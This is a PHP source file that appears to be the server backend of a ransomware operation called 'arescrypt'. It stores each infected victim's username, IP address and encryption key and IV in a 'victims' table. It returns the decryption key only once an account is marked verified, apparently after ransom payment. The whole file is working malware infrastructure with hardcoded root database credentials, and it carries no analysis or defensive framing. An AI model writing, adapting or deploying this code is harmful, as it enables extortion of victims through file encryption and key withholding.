﻿<?php

// error_reporting(E_ALL);
// ini_set("display_errors", "On");

define("db_server", "localhost");
define("db_name", "arescrypt");
define("db_username", "root");
define("db_password", "toor");

// Create connection
$mysqli = new mysqli(db_server, db_username, db_password, db_name);

// Check connection
if ($mysqli->connect_error) {
    // connection failed
    die("Connection failed: " . $mysqli->connect_error);
}
// echo "Connected to " . db_server . "\\" . db_name . " successfully.";
// connected successfully

if ($_SERVER['REQUEST_METHOD'] == "GET") {
	// echo "Loaded through " . $_SERVER['REQUEST_METHOD'] ." request";
	$verifiedAccount = false;

	if (isset($_GET['uniqueKey']) && isset($_GET['userDomUser'])) {
		$stmt = $mysqli->prepare('SELECT verifiedAccount FROM `victims` WHERE uniqueKey = ? AND userDomUser = ? LIMIT 1');
		if ( !$stmt )
			$error[] = $mysqli->error;
		else if ( !$stmt->bind_param('ss', $_GET['uniqueKey'], $_GET['userDomUser']) )
			$error[] = $stmt->error;
		else if ( !$stmt->execute() )
			$error[] = $stmt->error;
		else {
			$result = $stmt->get_result();
			foreach ($result as $row) {
				$verifiedAccount = $row["verifiedAccount"];
				$encKey = $row["encKey"];
				$encIV = $row["encIV"];
			}
			if ($verifiedAccount)
				echo json_encode(array("encKey" => $encKey, "encIV" => $encIV, "verifiedAccount" => $verifiedAccount));
			else
				echo json_encode(array("verifiedAccount" => $verifiedAccount));
		}
	}

} elseif ($_SERVER['REQUEST_METHOD'] == "POST") {
	// echo "Loaded through " . $_SERVER['REQUEST_METHOD'] . " request.";

/*
CREATE TABLE victims (
userID INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
uniqueKey VARCHAR(12) NOT NULL,
userDomUser VARCHAR(100) NOT NULL,
userIPAddr VARCHAR(45) NOT NULL,
encKey VARCHAR(500) NOT NULL,
encIV VARCHAR(500) NOT NULL,
verifiedAccount BOOLEAN NOT NULL DEFAULT 0,
reqDate TIMESTAMP
)
*/
	// let's set variables
	$uniqueKey = htmlspecialchars($_POST["uniqueKey"]);
	$userDomUser = htmlspecialchars($_POST["userDomUser"]);
	$userIPAddr = htmlspecialchars($_POST["userIPAddr"]);
	$encKey = $_POST["encKey"]; // should be recieved in Base64 format
	$encIV = $_POST["encIV"]; // should be recieved in Base64 format

	// let's add some filters
	if (empty($uniqueKey) || strlen($uniqueKey) != 0xC) { // 0xC = 12
		die("Please correct 'uniqueKey'");
	} elseif (empty($userDomUser) || strlen($userDomUser) > 100) {
		die("Please correct 'userDomUser'");
	} elseif (empty($userIPAddr) || strlen($userIPAddr) > 45) {
		die("Please correct 'userIPAddr'");
	} elseif (empty($encKey) || strlen($encKey) > 500) {
		die("Please correct 'encKey'");
	} elseif (empty($encIV) || strlen($encIV) > 500) {
		die("Please correct 'encIV'");
	}

	$stmt = $mysqli->prepare("INSERT INTO victims (uniqueKey, userIPAddr, userDomUser, encKey, encIV) VALUES (?, ?, ?, ?, ?)");
	$stmt->bind_param('sssss', $uniqueKey, $userIPAddr, $userDomUser, $encKey, $encIV);

	if ($stmt->execute() === true) {
		$stmt->close();
		$mysqli->close();
	} else
		echo $mysqli->error;
}

?>